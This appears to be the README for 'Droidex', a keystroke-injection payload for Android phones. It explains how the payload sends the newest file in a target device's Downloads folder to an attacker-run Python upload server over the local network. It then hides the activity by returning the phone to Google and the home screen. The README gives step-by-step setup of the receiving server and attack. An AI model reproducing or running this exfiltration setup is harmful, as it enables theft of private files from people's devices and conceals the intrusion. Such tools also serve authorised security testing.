REM TITLE: Droidex

REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)

REM TARGET OS: Android (tested on Samsung S24 FE | Android 15 | One UI 7.0)

Droidex exfiltrates the top file stored in the Downloads directory of target mobile device to a self-hosted python webserver over LAN. Both the attacker machine and target device must be connected to the same LAN. The payload will use Google Search to navigate to the self-hosted webserver and upload the file. After exfiltration, the browser will navigate to `google.com` and the device will return to the home screen to obfuscate activity.

**REQUIRED DEPENDENCIES**

Python module [uploadserver](https://pypi.org/project/uploadserver/)

 1. Install `uploadserver` on attack machine (`python3 -m pip install --user uploadserver`).
 2. Enter `ifconfig` in terminal of attack machine (Linux) to find machine IP address.
 3. Place the IP address found via `ifconfig` into line 6 (`DEFINE #IPA x.x.x.x:8000/upload`) of payload.txt.
 4. Start the webserver (`python3 -m uploadserver`).
 5. Perform attack.
 6. The file will be saved to the current working directory on the attacker machine where the server is being hosted from.

![Diagram](https://github.com/user-attachments/assets/08dddce3-65ee-4711-ac3b-682a1358e325)
